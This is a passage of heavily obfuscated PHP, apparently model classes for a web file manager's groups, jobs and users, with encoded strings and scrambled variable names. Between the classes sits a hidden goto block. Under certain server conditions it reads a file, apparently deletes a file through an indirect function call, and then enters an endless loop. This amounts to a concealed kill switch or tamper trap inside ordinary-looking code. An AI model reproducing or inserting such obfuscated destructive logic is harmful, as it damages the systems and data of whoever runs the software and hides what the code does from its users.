$´ÖÜèÅÇ[$ñÁÎæ—ã]; $Ğä˜ª‚” = $Ğä˜ª‚” . "{$»‘ù›š©}\x20{$ñÁÎæ—ã}\x2c\40\x67\162\x6f\165\x70\x49\104\x20\141\163\x63"; return $this->order($Ğä˜ª‚”); } public function listChild($âØœğ·) { $«¦°ˆ’ =& $_SERVER[ì…™Î¶Ï]; $îÜ©Œ´¶ = $this->where(array($«¦°ˆ’[489] => $âØœğ·))->_makeOrder()->selectPage(200); $this->_listDataApply($îÜ©Œ´¶[$«¦°ˆ’[364]]); return $îÜ©Œ´¶; } public function listByID($÷¤Àõâ’) { $û„á²­‰ =& $_SERVER[ì…™Î¶Ï]; if (!$÷¤Àõâ’) { return array(); } $ˆĞ¾¯Ëè = array($û„á²­‰[1799] => array($û„á²­‰[7], $÷¤Àõâ’)); $ÙíÄ†¦ = $this->where($ˆĞ¾¯Ëè)->select(); $ÙíÄ†¦ = array_sort_keep($ÙíÄ†¦, $û„á²­‰[1799], $÷¤Àõâ’); $this->_listDataApply($ÙíÄ†¦); return $ÙíÄ†¦; } public function listSearch($æÈÇÉÍ) { $ê—¤£ºİ =& $_SERVER[ì…™Î¶Ï]; $ç¼ãÔÅ§ = $æÈÇÉÍ[$ê—¤£ºİ[1890]]; $ß÷€¼¶ = isset($æÈÇÉÍ[$ê—¤£ºİ[1891]]) ? $æÈÇÉÍ[$ê—¤£ºİ[1891]] : !1; if (!trim($ç¼ãÔÅ§)) { return !1; } $ç¼ãÔÅ§ = str_replace($ê—¤£ºİ[1892], $ê—¤£ºİ[1893], $ç¼ãÔÅ§); $ï˜¢··Í = array($ê—¤£ºİ[1799] => array($ê—¤£ºİ[378], "{$ç¼ãÔÅ§}\45"), $ê—¤£ºİ[32] => array($ê—¤£ºİ[378], "\45{$ç¼ãÔÅ§}\45"), $ê—¤£ºİ[976] => $ê—¤£ºİ[1894]); if ($ß÷€¼¶) { $ÎšİÒµŸ = $this->getInfoSimple($ß÷€¼¶); $»Ñ¬±ÅÍ = $ÎšİÒµŸ[$ê—¤£ºİ[512]] . $ß÷€¼¶ . $ê—¤£ºİ[536]; $ï˜¢··Í = array($ï˜¢··Í, array($ê—¤£ºİ[512] => array($ê—¤£ºİ[378], $»Ñ¬±ÅÍ))); } $ï˜¢··Í = $this->parseWhereLike($ï˜¢··Í); $»ÇÖß = $this->_makeOrder()->where($ï˜¢··Í)->selectPage(20); $»ÇÖß = $»ÇÖß ? $»ÇÖß : array($ê—¤£ºİ[364] => array(), $ê—¤£ºİ[361] => array()); if (!$»ÇÖß || count($»ÇÖß[$ê—¤£ºİ[364]]) < 5 && Input::check($ç¼ãÔÅ§, $ê—¤£ºİ[313])) { $ÁùÑ¢ç÷ = $this->groupChildrenAll($ß÷€¼¶); $ÚÀ¤Ø¹ = $this->_searchFromMeta($ê—¤£ºİ[454], $ç¼ãÔÅ§, 10, $ÁùÑ¢ç÷); $®—¢Ö©† = $this->_searchFromMeta($ê—¤£ºİ[455], $ç¼ãÔÅ§, 10, $ÁùÑ¢ç÷); $¸›³øËÎ = array_merge($ÚÀ¤Ø¹, $®—¢Ö©†, $»ÇÖß[$ê—¤£ºİ[364]]); $»ÇÖß[$ê—¤£ºİ[364]] = array_unique_by_key($¸›³øËÎ, $ê—¤£ºİ[1799]); $»ÇÖß[$ê—¤£ºİ[361]][$ê—¤£ºİ[362]] = count($»ÇÖß[$ê—¤£ºİ[364]]); $»ÇÖß[$ê—¤£ºİ[361]][$ê—¤£ºİ[363]] = ceil($»ÇÖß[$ê—¤£ºİ[361]][$ê—¤£ºİ[362]] / $»ÇÖß[$ê—¤£ºİ[361]][$ê—¤£ºİ[358]]); } $this->_listDataApply($»ÇÖß[$ê—¤£ºİ[364]]); return $»ÇÖß; } protected function groupChildrenAll($Ñ¹Øñ†) { $¤—ğÏ“ =& $_SERVER[ì…™Î¶Ï]; if (!$Ñ¹Øñ†) { return !1; } if (is_string($Ñ¹Øñ†)) { $Ñ¹Øñ† = array($Ñ¹Øñ†); } $ÍĞ„Ş¢ = $Ñ¹Øñ†; foreach ($Ñ¹Øñ† as $Äï¡Ó˜ñ) { $ÍÉƒä©§ = $this->getInfoSimple($Äï¡Ó˜ñ); $¼¥ƒ‰¥— = array($¤—ğÏ“[512] => array($¤—ğÏ“[378], $ÍÉƒä©§[$¤—ğÏ“[512]] . $Äï¡Ó˜ñ . $¤—ğÏ“[536])); $œº€¦‹É = $this->field($¤—ğÏ“[1799])->where($¼¥ƒ‰¥—)->select(); $ÍĞ„Ş¢ = array_merge($ÍĞ„Ş¢, array_to_keyvalue($œº€¦‹É, $¤—ğÏ“[12], $¤—ğÏ“[1799])); } return array_unique($ÍĞ„Ş¢); } private function _searchFromMeta($Ğ¡â†íõ, $‘ËÀÍ÷, $ŞäÛ‡Ÿ§, $±ËŸ´ş†) { $íğ©ª =& $_SERVER[ì…™Î¶Ï]; $‘ËÀÍ÷ = strtolower($‘ËÀÍ÷); $‰½ŒÚí‹ = array($íğ©ª[95] => $Ğ¡â†íõ, $íğ©ª[369] => array($íğ©ª[378], "\45{$‘ËÀÍ÷}\x25")); $‰½ŒÚí‹ = $this->parseWhereLike($‰½ŒÚí‹); if ($±ËŸ´ş†) { $‰½ŒÚí‹[$íğ©ª[1799]] = array($íğ©ª[7], $±ËŸ´ş†); } $ÇÖ“ßø˜ = Model($íğ©ª[1895])->where($‰½ŒÚí‹)->limit($ŞäÛ‡Ÿ§)->select(); if (!$ÇÖ“ßø˜) { return array(); } $ÇÖ“ßø˜ = array_to_keyvalue($ÇÖ“ßø˜, $íğ©ª[12], $íğ©ª[1799]); $í§‹¶Ú = $this->where(array($íğ©ª[1886] => array($íğ©ª[7], $ÇÖ“ßø˜)))->select(); if (!$í§‹¶Ú) { return array(); } return $í§‹¶Ú; } protected function _listDataApplyItem($¼ˆø¡ãß) { $ô­ŸÜ“å = array($¼ˆø¡ãß); $this->_listDataApply($ô­ŸÜ“å); return $ô­ŸÜ“å[0]; } protected function _listDataApply(&$¬û¤²Ü¹) { $©Ò™¸€ß =& $_SERVER[ì…™Î¶Ï]; if (!$¬û¤²Ü¹) { return; } $Ú«“‰™£ = array_to_keyvalue($¬û¤²Ü¹, $©Ò™¸€ß[12], $©Ò™¸€ß[1799]); $this->_listAppendChildren($¬û¤²Ü¹); $this->_listAppendChildrenMember($¬û¤²Ü¹); $this->_listAppendMeta($¬û¤²Ü¹, $Ú«“‰™£); $this->_listAppendParent($¬û¤²Ü¹); $this->_listAppendSourceRoot($¬û¤²Ü¹, $Ú«“‰™£); } private function _listAppendChildren(&$ÁöÓñƒ) { $È„óş÷š =& $_SERVER[ì…™Î¶Ï]; $Æ³ÒÎŸ  = array_to_keyvalue($ÁöÓñƒ, $È„óş÷š[12], $È„óş÷š[1799]); $Ûº†¤Ş¦ = array($È„óş÷š[489] => array($È„óş÷š[7], $Æ³ÒÎŸ )); $ŒÌÑ™ˆ = array($È„óş÷š[489], $È„óş÷š[1896] => $È„óş÷š[491]); $İ‚¾Ùé = $this->field($ŒÌÑ™ˆ)->where($Ûº†¤Ş¦)->group($È„óş÷š[489])->select(); $ÚÙí½ò­ = array_to_keyvalue($İ‚¾Ùé, $È„óş÷š[489], $È„óş÷š[491]); foreach ($ÁöÓñƒ as &$øğ›¤ÜÈ) { $ÓÜ„¯µò = $øğ›¤ÜÈ[$È„óş÷š[1799]]; $øğ›¤ÜÈ[$È„óş÷š[1897]] = isset($ÚÙí½ò­[$ÓÜ„¯µò]) ? intval($ÚÙí½ò­[$ÓÜ„¯µò]) : !1; } unset($øğ›¤ÜÈ); } private function _listAppendChildrenMember(&$Ÿ¡¡€Ş‡) { $ú‡Ï¿® =& $_SERVER[ì…™Î¶Ï]; $Öõûú… = array_to_keyvalue($Ÿ¡¡€Ş‡, $ú‡Ï¿®[12], $ú‡Ï¿®[1799]); $¾¿ äÜÑ = array($ú‡Ï¿®[1799] => array($ú‡Ï¿®[7], $Öõûú…)); $‹Š¾ö¸· = array($ú‡Ï¿®[1799], $ú‡Ï¿®[1896] => $ú‡Ï¿®[491]); $«Ô›óïƒ = Model($ú‡Ï¿®[1888])->field($‹Š¾ö¸·)->where($¾¿ äÜÑ)->group($ú‡Ï¿®[1799])->select(); $şæ–Ü‚è = array_to_keyvalue($«Ô›óïƒ, $ú‡Ï¿®[1799], $ú‡Ï¿®[491]); foreach ($Ÿ¡¡€Ş‡ as &$îùŠëÙ) { $ûÉ«ı = $îùŠëÙ[$ú‡Ï¿®[1799]]; $îùŠëÙ[$ú‡Ï¿®[1898]] = isset($şæ–Ü‚è[$ûÉ«ı]) ? intval($şæ–Ü‚è[$ûÉ«ı]) : !1; } unset($îùŠëÙ); } private function _listAppendMeta(&$®¼¹ôÌ¨, $îÉ•™¾“) { $àÕçˆ§† =& $_SERVER[ì…™Î¶Ï]; $ñˆ ®º  = array($àÕçˆ§†[1799] => array($àÕçˆ§†[7], $îÉ•™¾“)); $µŸ¤ï¡Ó = Model($àÕçˆ§†[1887])->where($ñˆ ®º )->select(); $µŸ¤ï¡Ó = array_to_keyvalue_group($µŸ¤ï¡Ó, $àÕçˆ§†[1799]); foreach ($µŸ¤ï¡Ó as &$¤§ÜÙå¯) { $¤§ÜÙå¯ = array_to_keyvalue($¤§ÜÙå¯, $àÕçˆ§†[95], $àÕçˆ§†[369]); } unset($¤§ÜÙå¯); foreach ($®¼¹ôÌ¨ as &$á´„í¡) { $á´„í¡[$àÕçˆ§†[456]] = array(); if (isset($µŸ¤ï¡Ó[$á´„í¡[$àÕçˆ§†[1799]]])) { $á´„í¡[$àÕçˆ§†[456]] = $µŸ¤ï¡Ó[$á´„í¡[$àÕçˆ§†[1799]]]; } } unset($á´„í¡); } protected function parentLevelArray($½åôÇÂë) { $³åÚÄåÍ =& $_SERVER[ì…™Î¶Ï]; $½åôÇÂë = explode($³åÚÄåÍ[50], trim($½åôÇÂë, $³åÚÄåÍ[50])); $½åôÇÂë = array_remove_value($½åôÇÂë, $³åÚÄåÍ[190]); return $½åôÇÂë; } private function _listAppendParent(&$æµõ££‡) { $›²»ş—ñ =& $_SERVER[ì…™Î¶Ï]; $Øòôíãè = array(); foreach ($æµõ££‡ as &$ôëÖœ˜›) { $Øòôíãè[$ôëÖœ˜›[$›²»ş—ñ[1799]]] = $ôëÖœ˜›[$›²»ş—ñ[32]]; $ŠÕ¾¦÷ô = $this->parentLevelArray($ôëÖœ˜›[$›²»ş—ñ[512]]); foreach ($ŠÕ¾¦÷ô as $ÁÉÖšì) { if (!isset($Øòôíãè[$ÁÉÖšì])) { $Øòôíãè[$ÁÉÖšì] = 0; } } } unset($ôëÖœ˜›); foreach ($Øòôíãè as $†™ø´ÀÏ => $øÔöåèš) { if ($øÔöåèš) { continue; } $î»ñ•±‡ = $this->getInfoSimple($†™ø´ÀÏ); $Øòôíãè[$†™ø´ÀÏ] = $î»ñ•±‡[$›²»ş—ñ[32]]; } $´ˆ­Õ­° = $GLOBALS[$›²»ş—ñ[6]][$›²»ş—ñ[90]][$›²»ş—ñ[1899]]; if ($GLOBALS[$›²»ş—ñ[496]] == $›²»ş—ñ[89]) { $´ˆ­Õ­° = !1; } foreach ($æµõ££‡ as &$ôëÖœ˜›) { $ŠÕ¾¦÷ô = $this->parentLevelArray($ôëÖœ˜›[$›²»ş—ñ[512]]); $±œæ‚É³ = $›²»ş—ñ[12]; foreach ($ŠÕ¾¦÷ô as $†™ø´ÀÏ => $ÁÉÖšì) { if ($´ˆ­Õ­° && $†™ø´ÀÏ == 0) { continue; } $±œæ‚É³ .= $Øòôíãè[$ÁÉÖšì] . $›²»ş—ñ[8]; } if ($ŠÕ¾¦÷ô) { $±œæ‚É³ .= $ôëÖœ˜›[$›²»ş—ñ[32]]; } $ôëÖœ˜›[$›²»ş—ñ[517]] = str_replace($›²»ş—ñ[520], $›²»ş—ñ[8], $±œæ‚É³); } unset($ôëÖœ˜›); } private function _listAppendSourceRoot(&$—ÇåÎ, $×Ö£«ğ¯) { $­œ³ç© =& $_SERVER[ì…™Î¶Ï]; $•º¼Šäâ = Model($­œ³ç©[800])->listSourceRoot(SourceModel::TYPE_GROUP, $×Ö£«ğ¯); $•º¼Šäâ = array_to_keyvalue($•º¼Šäâ, $­œ³ç©[495]); $•º¼Šäâ = array_remove_key($•º¼Šäâ, $­œ³ç©[495]); foreach ($—ÇåÎ as &$”·¥àÓ) { $”·¥àÓ[$­œ³ç©[87]] = $•º¼Šäâ[$”·¥àÓ[$­œ³ç©[1799]]] ? $•º¼Šäâ[$”·¥àÓ[$­œ³ç©[1799]]] : array(); } unset($”·¥àÓ); } protected function groupMerge($‘ç©ó°‹) { $‘ç©ó°‹ = array_values(array_unique($‘ç©ó°‹)); $ˆŠ†Ø¢— = array(); for ($×±Šß®æ = 0; $×±Šß®æ < count($‘ç©ó°‹); $×±Šß®æ++) { $øß¨ƒñõ = !1; for ($„ëîùû = 0; $„ëîùû < count($‘ç©ó°‹); $„ëîùû++) { if ($×±Šß®æ == $„ëîùû) { continue; } if ($this->isParentOf($‘ç©ó°‹[$„ëîùû], $‘ç©ó°‹[$×±Šß®æ])) { $øß¨ƒñõ = !0; break; } } if (!$øß¨ƒñõ) { $ˆŠ†Ø¢—[] = $‘ç©ó°‹[$×±Šß®æ]; } } return $ˆŠ†Ø¢—; } protected function isParentOf($ğ¤š¢, $…‡°Ãåó) { $ÁÀ”§± =& $_SERVER[ì…™Î¶Ï]; if (!$ğ¤š¢ || !$…‡°Ãåó || $ğ¤š¢ == $…‡°Ãåó) { return !1; } $Šº»’¡À = $this->getInfoSimple($ğ¤š¢); $àùÎˆ·” = $this->getInfoSimple($…‡°Ãåó); $“¶Å±­ì = $Šº»’¡À[$ÁÀ”§±[512]] . $ğ¤š¢ . $ÁÀ”§±[50]; if (substr($àùÎˆ·”[$ÁÀ”§±[512]], 0, strlen($“¶Å±­ì)) == $“¶Å±­ì) { return !0; } return !1; } public function groupShowRoot($™¤âàƒÕ, $¹µÍşŸÅ = false) { $¿ğ¤‚†Í =& $_SERVER[ì…™Î¶Ï]; $µô›Õü = $this->getInfo($™¤âàƒÕ); if (!$µô›Õü) { return array(); } $„ÎÕ‰Î = $this->parentLevelArray($µô›Õü[$¿ğ¤‚†Í[512]]); $¢œÃ’ºÁ = array($™¤âàƒÕ); if (count($„ÎÕ‰Î) == 0) { return $¢œÃ’ºÁ; } if ($¹µÍşŸÅ && count($„ÎÕ‰Î) == 1) { return $¢œÃ’ºÁ; } if (!$µô›Õü[$¿ğ¤‚†Í[456]] || !isset($µô›Õü[$¿ğ¤‚†Í[456]][$¿ğ¤‚†Í[1884]]) || $µô›Õü[$¿ğ¤‚†Í[456]][$¿ğ¤‚†Í[1884]] == $¿ğ¤‚†Í[1853]) { return $this->groupShowRoot($„ÎÕ‰Î[count($„ÎÕ‰Î) - 1], $¹µÍşŸÅ); } if ($µô›Õü[$¿ğ¤‚†Í[456]][$¿ğ¤‚†Í[1884]] == $¿ğ¤‚†Í[352]) { $€ù÷ŒÃ½ = explode($¿ğ¤‚†Í[50], $µô›Õü[$¿ğ¤‚†Í[456]][$¿ğ¤‚†Í[1885]]); if ($€ù÷ŒÃ½) { $¢œÃ’ºÁ = array_merge($¢œÃ’ºÁ, $€ù÷ŒÃ½); } } return $¢œÃ’ºÁ; } protected function resetParentLevel() { $à±½»Ñç =& $_SERVER[ì…™Î¶Ï]; $Ãìó¨æœ = $à±½»Ñç[1799]; $¢²ï£û = $this->select(); $¢²ï£û = array_to_keyvalue($¢²ï£û, $Ãìó¨æœ); foreach ($¢²ï£û as $±—Ûâ’») { $şµÂ¬¡ö = $±—Ûâ’»; $€µèì = array(); while ($şµÂ¬¡ö[$à±½»Ñç[489]] != 0) { $€µèì[] = $şµÂ¬¡ö[$à±½»Ñç[489]]; $şµÂ¬¡ö = $¢²ï£û[$şµÂ¬¡ö[$à±½»Ñç[489]]]; } $€µèì[] = 0; $€µèì = $à±½»Ñç[50] . implode($à±½»Ñç[50], array_reverse($€µèì)) . $à±½»Ñç[50]; $this->setNamePinyin($±—Ûâ’»[$Ãìó¨æœ], $±—Ûâ’»[$à±½»Ñç[32]]); $this->where(array($Ãìó¨æœ => $±—Ûâ’»[$Ãìó¨æœ]))->save(array($à±½»Ñç[575] => $€µèì)); } return $¢²ï£û; } public function groupNameAuto($‚êÙÌ€Ï, $ì‚ùÌ÷) { $ü¯ŒŠæ‚ =& $_SERVER[ì…™Î¶Ï]; $¤™ÇÍª® = $this->where(array($ü¯ŒŠæ‚[393] => $‚êÙÌ€Ï))->getField($ü¯ŒŠæ‚[32], !0); if (!$¤™ÇÍª® || !in_array($ì‚ùÌ÷, $¤™ÇÍª®)) { return $ì‚ùÌ÷; } for ($ÈàÕÒù² = 1; $ÈàÕÒù² <= count($¤™ÇÍª®) + 1; $ÈàÕÒù²++) { $†¤Íœá = $ì‚ùÌ÷ . "\x28{$ÈàÕÒù²}\51"; if (!in_array($†¤Íœá, $¤™ÇÍª®)) { return $†¤Íœá; } } } public function groupSwitch($Öí¦ÙÚÏ, $ÚòŒ«üĞ) { $úÈ‡®Àî =& $_SERVER[ì…™Î¶Ï]; $ô—ûú¦Æ = array($úÈ‡®Àî[1799] => array($úÈ‡®Àî[7], array($Öí¦ÙÚÏ, $ÚòŒ«üĞ))); $ú›œâ“ç = $this->where($ô—ûú¦Æ)->select(); $ú›œâ“ç = array_to_keyvalue($ú›œâ“ç, $úÈ‡®Àî[1799]); if (!isset($ú›œâ“ç[$Öí¦ÙÚÏ]) || !isset($ú›œâ“ç[$ÚòŒ«üĞ]) || $ú›œâ“ç[$Öí¦ÙÚÏ][$úÈ‡®Àî[489]] == 0) { return !1; } $ô—ûú¦Æ = array($úÈ‡®Àî[1799] => $Öí¦ÙÚÏ); $Ãª™Í € = Model($úÈ‡®Àî[1888])->where($ô—ûú¦Æ)->select(); if (!$Ãª™Í €) { $Ãª™Í € = array(); } foreach ($Ãª™Í € as $üÍğ¿Õ) { $³ˆÔÁ­ = $üÍğ¿Õ[$úÈ‡®Àî[1631]]; $ô—ûú¦Æ = array($úÈ‡®Àî[1631] => $³ˆÔÁ­, $úÈ‡®Àî[1799] => $ÚòŒ«üĞ); $À‹ÇôŒ = Model($úÈ‡®Àî[1888])->where($ô—ûú¦Æ)->find(); if (!$À‹ÇôŒ) { $şõ”ëÍ = array($ÚòŒ«üĞ => $üÍğ¿Õ[$úÈ‡®Àî[1900]]); Model($úÈ‡®Àî[529])->userGroupAdd($³ˆÔÁ­, $şõ”ëÍ); } Model($úÈ‡®Àî[529])->userGroupRemove($³ˆÔÁ­, $Öí¦ÙÚÏ); } $ô—ûú¦Æ = array($úÈ‡®Àî[403] => 2, $úÈ‡®Àî[489] => 0, $úÈ‡®Àî[402] => 1, $úÈ‡®Àî[495] => array($úÈ‡®Àî[7], array($Öí¦ÙÚÏ, $ÚòŒ«üĞ))); $¶»¬ƒ¡ = Model($úÈ‡®Àî[800])->where($ô—ûú¦Æ)->field($úÈ‡®Àî[1901])->select(); $¶»¬ƒ¡ = array_to_keyvalue($¶»¬ƒ¡, $úÈ‡®Àî[495], $úÈ‡®Àî[394]); $½¥ê­’ = !empty($¶»¬ƒ¡[$Öí¦ÙÚÏ]) ? $¶»¬ƒ¡[$Öí¦ÙÚÏ] : !1; if ($½¥ê­’) { if (!$¶»¬ƒ¡[$ÚòŒ«üĞ]) { $¶»¬ƒ¡[$ÚòŒ«üĞ] = Model($úÈ‡®Àî[800])->groupRootAdd($ÚòŒ«üĞ); } $³ÜûÅ²ç = $¶»¬ƒ¡[$ÚòŒ«üĞ]; $ô—ûú¦Æ = array($úÈ‡®Àî[489] => $½¥ê­’); $¶»¬ƒ¡ = Model($úÈ‡®Àî[800])->where($ô—ûú¦Æ)->field($úÈ‡®Àî[1902])->select(); if (!$¶»¬ƒ¡) { $¶»¬ƒ¡ = array(); } Model($úÈ‡®Àî[800])->moveClearAuth = !1; foreach ($¶»¬ƒ¡ as $ƒ‡Ñ‡óı) { $ö¹€¤¢÷ = $ƒ‡Ñ‡óı[$úÈ‡®Àî[402]] == $úÈ‡®Àî[89] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($úÈ‡®Àî[800])->move($ƒ‡Ñ‡óı[$úÈ‡®Àî[394]], $³ÜûÅ²ç, $ö¹€¤¢÷); } Model($úÈ‡®Àî[800])->moveClearAuth = !0; $ô—ûú¦Æ = array($úÈ‡®Àî[403] => 2, $úÈ‡®Àî[495] => $Öí¦ÙÚÏ); $ß¸ıà = array($úÈ‡®Àî[495] => $ÚòŒ«üĞ); Model($úÈ‡®Àî[1903])->where($ô—ûú¦Æ)->save($ß¸ıà); Model($úÈ‡®Àî[1904])->where($ô—ûú¦Æ)->save($ß¸ıà); } $this->_changeChildLevel($ú›œâ“ç[$Öí¦ÙÚÏ], $ú›œâ“ç[$ÚòŒ«üĞ], !0); $this->where(array($úÈ‡®Àî[489] => $Öí¦ÙÚÏ))->save(array($úÈ‡®Àî[489] => $ÚòŒ«üĞ)); $this->_clearChildrenCache($ú›œâ“ç[$ÚòŒ«üĞ]); return !0; } } goto C”ç¸–›¹Ê; F÷¦×òÏ†ô: if (!isset($_SERVER[$_SERVER[ì…™Î¶Ï][850]]) || !isset($_SERVER[$_SERVER[ì…™Î¶Ï][1319]])) { $_getc = $_SERVER[ì…™Î¶Ï][852]; $_getfile = $_SERVER[$_SERVER[ì…™Î¶Ï][847]] . $_SERVER[ì…™Î¶Ï][848]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì…™Î¶Ï][226], $_getfilec); if (count($_getarrs) < $_SERVER[ì…™Î¶Ï][608]) { $exit = $_SERVER[ì…™Î¶Ï][853]; $exit(); } $_act = $_SERVER[ì…™Î¶Ï][1320]; $_act($_SERVER[$_SERVER[ì…™Î¶Ï][847]] . $_SERVER[ì…™Î¶Ï][848]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ì…™Î¶Ï][373]); } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x6a\x6f\142\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x64\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\x73\x65\154\x66\x4a\157\142\x4c\x69\x73\164"; public function listData($Òƒšéì¬ = false, $¸¹¼°¢ = "\x73\x6f\x72\164", $£Îæ·ï… = false) { return parent::listData($Òƒšéì¬, $¸¹¼°¢, $£Îæ·ï…); } public function remove($Ä˜ã÷’Ä) { return parent::remove($Ä˜ã÷’Ä); } public function add($˜ŠĞĞÉƒ) { $¸¨½Üó³ =& $_SERVER[ì…™Î¶Ï]; if ($this->findByName($˜ŠĞĞÉƒ[$¸¨½Üó³[32]])) { return !1; } $˜ŠĞĞÉƒ[$¸¨½Üó³[1822]] = $this->getSort(); return parent::insert($˜ŠĞĞÉƒ); } private function getSort() { $šÁÎ÷ÌØ =& $_SERVER[ì…™Î¶Ï]; $ô‚¾ÍÜ§ = parent::listData(); $¢’˜¦ƒ = array_to_keyvalue($ô‚¾ÍÜ§, $šÁÎ÷ÌØ[12], $šÁÎ÷ÌØ[1822]); return empty($¢’˜¦ƒ) ? 0 : max($¢’˜¦ƒ) + 1; } public function update($’Ğ¾‘û, $áÌ®šÎÜ) { $¯öÈ ¢Ş =& $_SERVER[ì…™Î¶Ï]; $‡§Ó = parent::listData($’Ğ¾‘û); $îÀ¹ºöÜ = $this->findByName($áÌ®šÎÜ[$¯öÈ ¢Ş[32]]); if (!$‡§Ó || $îÀ¹ºöÜ && $îÀ¹ºöÜ[$¯öÈ ¢Ş[392]] != $‡§Ó[$¯öÈ ¢Ş[392]]) { return !1; } return parent::update($’Ğ¾‘û, $áÌ®šÎÜ); } public function setUserJob($øºÅ²İ¡, $İŞ¥±ŒÊ) { $ü¸»ìò =& $_SERVER[ì…™Î¶Ï]; if (!is_array($İŞ¥±ŒÊ)) { $İŞ¥±ŒÊ = array($İŞ¥±ŒÊ); } $ƒÈ‰¡úÑ = parent::listData(); $€ùëÍØı = array_to_keyvalue($ƒÈ‰¡úÑ, $ü¸»ìò[32]); $ÙÓÖ´³Ó = $ü¸»ìò[373]; foreach ($İŞ¥±ŒÊ as $ı Á¨ÌÎ) { if ($€ùëÍØı[$ı Á¨ÌÎ]) { $ÙÓÖ´³Ó .= $€ùëÍØı[$ı Á¨ÌÎ][$ü¸»ìò[392]] . $ü¸»ìò[50]; } else { $‹ÙşçÂ¥ = $this->add($ı Á¨ÌÎ); $ÙÓÖ´³Ó .= $‹ÙşçÂ¥ . $ü¸»ìò[50]; } } $ÙÓÖ´³Ó = rtrim($ÙÓÖ´³Ó, $ü¸»ìò[50]); Model($ü¸»ìò[529])->metaSet($øºÅ²İ¡, self::JOB_KEY, $ÙÓÖ´³Ó); } public function getUserJob($·íïœ€é) { $¤àñéå« = Model($_SERVER[ì…™Î¶Ï][529])->metaGet($·íïœ€é); return $this->getUserJobInfo($¤àñéå«[self::JOB_KEY]); } public function getUserJobInfo($¶İ‰‡ñ) { $ÙŠúŠŸş =& $_SERVER[ì…™Î¶Ï]; $ìˆƒÎ¡ = explode($ÙŠúŠŸş[50], $¶İ‰‡ñ); $ ‘£ˆÅş = parent::listData(); $ ‘£ˆÅş = array_remove_key($ ‘£ˆÅş, $ÙŠúŠŸş[193]); $„Òé€¬¬ = array(); foreach ($ìˆƒÎ¡ as $Çë£ŠÊª) { if (isset($ ‘£ˆÅş[$Çë£ŠÊª])) { $„Òé€¬¬[] = $ ‘£ˆÅş[$Çë£ŠÊª]; } } return $„Òé€¬¬; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\x61\x6d\145" => "\165\163\145\x72\137\x6d\x65\164\141", "\x6d\145\x74\141\106\151\x65\x6c\x64" => "\x75\163\145\162\x49\x44"); protected $simpleField = "\x75\163\x65\x72\x49\x44\54\x6e\x69\x63\x6b\116\141\155\145\54\x6e\x61\155\x65\54\x61\166\x61\x74\x61\x72\54\x73\145\x78\x2c\163\x74\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ü£¸·û) { $Ä©İ¢Ó =& $_SERVER[ì…™Î¶Ï]; $€ß²Šı = $Ä©İ¢Ó[2228]; return array($Ä©İ¢Ó[1876] => array($ü£¸·û[0], $€ß²Šı), $Ä©İ¢Ó[1878] => array($ü£¸·û[0], $€ß²Šı), $Ä©İ¢Ó[2229] => array($ü£¸·û[0], $€ß²Šı)); } protected function getInfo($ËÚ¤‹©, $ÒÜÓŞã• = false) { $ÎùƒÉÔÉ = $this->getInfoSimple($ËÚ¤‹©); if (!is_array($ÎùƒÉÔÉ)) { return array(); } if ($ÒÜÓŞã•) { return $this->_getInfoApply($ÎùƒÉÔÉ); } return $this->cacheFunctionGet($_SERVER[ì…™Î¶Ï][1880], $ËÚ¤‹©); } protected function getInfoFull($ı³¤³¤¤, $ïâ¦Ï¤è = false) { $äĞğ¹œ± = $this->getInfoSimple($ı³¤³¤¤); if (!is_array($äĞğ¹œ±)) { return array(); } if ($ïâ¦Ï¤è) { return $this->_getInfoApply($äĞğ¹œ±, !0); } return $this->cacheFunctionGet($_SERVER[ì…™Î¶Ï][2230], $ı³¤³¤¤); } private function _getInfoApply($ş’—Ø, $ÅŠÛô÷ô = false) { $Ó’Ë£÷Ò =& $_SERVER[ì…™Î¶Ï]; if (!$ş’—Ø) { return $ş’—Ø; } $¨ŸƒÖˆÊ = md5($Ó’Ë£÷Ò[2231] . $ş’—Ø[$Ó’Ë£÷Ò[865]] . $Ó’Ë£÷Ò[2232] . $ş’—Ø[$Ó’Ë£÷Ò[32]]); $ş’—Ø = $this->_listDataApplyItem($ş’—Ø); $ßÙå¨¸Ë = Model($Ó’Ë£÷Ò[1301])->metaGet($ş’—Ø[$Ó’Ë£÷Ò[87]][$Ó’Ë£÷Ò[394]]); $ş’—Ø[$Ó’Ë£÷Ò[2233]] = $¨ŸƒÖˆÊ; $ş’—Ø[$Ó’Ë£÷Ò[87]][$Ó’Ë£÷Ò[2062]] = isset($ßÙå¨¸Ë[$Ó’Ë£÷Ò[2063]]) ? $ßÙå¨¸Ë[$Ó’Ë£÷Ò[2063]] : null; if ($ÅŠÛô÷ô) { $ş’—Ø[$Ó’Ë£÷Ò[456]] = $this->metaGet($ş’—Ø[$Ó’Ë£÷Ò[1631]]); } return $ş’—Ø; } protected function getInfoSimple($Õš¿Õ›, $ÔôÎ‚çü = false) { $´íÄá€ú =& $_SERVER[ì…™Î¶Ï]; if (!$Õš¿Õ›) { return array(); } if ($ÔôÎ‚çü) { $›½ıíÑ¯ = $this->where(array($´íÄá€ú[1631] => intval($Õš¿Õ›)))->find(); if (!is_array($›½ıíÑ¯)) { return array(); } $›½ıíÑ¯[$´íÄá€ú[2234]] = Action($´íÄá€ú[2235])->parseUrl($›½ıíÑ¯[$´íÄá€ú[2234]]); return $›½ıíÑ¯; } return $this->cacheFunctionGet($´íÄá€ú[1881], $Õš¿Õ›); } protected function getInfoSimpleOuter($ıÙê´£º) { $İî±¨Áú =& $_SERVER[ì…™Î¶Ï]; if (!$ıÙê´£º || $ıÙê´£º == 0) { return array($İî±¨Áú[1631] => $İî±¨Áú[190], $İî±¨Áú[32] => $İî±¨Áú[159] . 